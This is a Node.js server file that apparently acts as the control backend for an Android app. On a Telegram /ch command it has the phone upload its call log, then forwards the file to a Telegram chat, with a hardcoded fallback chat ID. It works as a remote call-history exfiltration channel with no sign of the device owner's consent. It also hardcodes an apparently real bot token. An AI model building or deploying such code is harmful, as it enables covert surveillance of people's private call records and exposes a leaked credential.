const express = require('express');
const { Telegraf } = require('telegraf');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());

// --- Setup Multer for file uploads ---
// Ensure uploads directory exists
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        cb(null, 'call_log.txt');
    }
});
const upload = multer({ storage: storage });

// --- Application State ---
// To track if a /ch command was requested
let pendingCommand = false;
let requestingChatId = null;

// --- Telegram Bot Setup ---
// Replace with your actual bot token
const BOT_TOKEN = '8710683386:AAFwZ_aRbFNVBVBO0HRGW6S_LBTCgYIiYZc';
const bot = new Telegraf(BOT_TOKEN);

bot.start((ctx) => ctx.reply('Bot is running. Send /ch to request call history from the Android device.'));

bot.command('ch', (ctx) => {
    // Acknowledge to the user
    ctx.reply('Command received. Waiting for the Android device to send the call history...');
    
    // Set the state so the Android app knows to send the data next time it checks
    pendingCommand = true;
    requestingChatId = ctx.chat.id;
});

// Launch bot
bot.launch().then(() => {
    console.log('Telegraf Bot launched!');
});

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

// --- Express API Endpoints for Android App ---

// 1. Android calls this periodically to see if there's a command waiting
app.get('/check-command', (req, res) => {
    if (pendingCommand) {
        // We have a command pending! Tell the app, then clear the pending state.
        res.json({ command: 'ch' });
        pendingCommand = false;
    } else {
        // No command pending
        res.json({ command: 'none' });
    }
});

// 2. Android calls this to upload the file after seeing the 'ch' command
app.post('/upload-log', upload.single('document'), async (req, res) => {
    if (!req.file) {
        return res.status(400).send('No file uploaded.');
    }

    if (requestingChatId) {
        try {
            // Forward the document back to the Telegram chat that requested it
            await bot.telegram.sendDocument(requestingChatId, {
                source: req.file.path,
                filename: 'call_log.txt'
            });
            console.log('Document sent successfully to Telegram.');
            res.status(200).send('File received and forwarded.');
        } catch (error) {
            console.error('Error forwarding to Telegram:', error);
            res.status(500).send('Error forwarding to Telegram.');
        } finally {
            // Clean up the uploaded file to save space
            fs.unlink(req.file.path, (err) => {
                if (err) console.error('Error deleting file:', err);
            });
            // Reset the chat id listener
            requestingChatId = null;
        }
    } else {
        // Fallback if we somehow got a file without a requesting chat ID
        console.warn('File received but no requestingChatId found.');
        
        // We can fall back to the default CHAT_ID the app originally used if we want,
        // or just ignore. We'll use the hardcoded one for safety.
        const FALLBACK_CHAT_ID = "1691680798";
        try {
            await bot.telegram.sendDocument(FALLBACK_CHAT_ID, {
                source: req.file.path,
                filename: 'call_log.txt'
            });
            res.status(200).send('File received and forwarded (fallback).');
        } catch (error) {
            console.error('Error forwarding to Telegram (fallback):', error);
            res.status(500).send('Error forwarding to Telegram (fallback).');
        } finally {
            fs.unlink(req.file.path, (err) => {
                if (err) console.error('Error deleting file:', err);
            });
        }
    }
});

// Basic health check for Render
app.get('/', (req, res) => {
    res.send('Server is running properly.');
});

// --- Server Startup ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
});
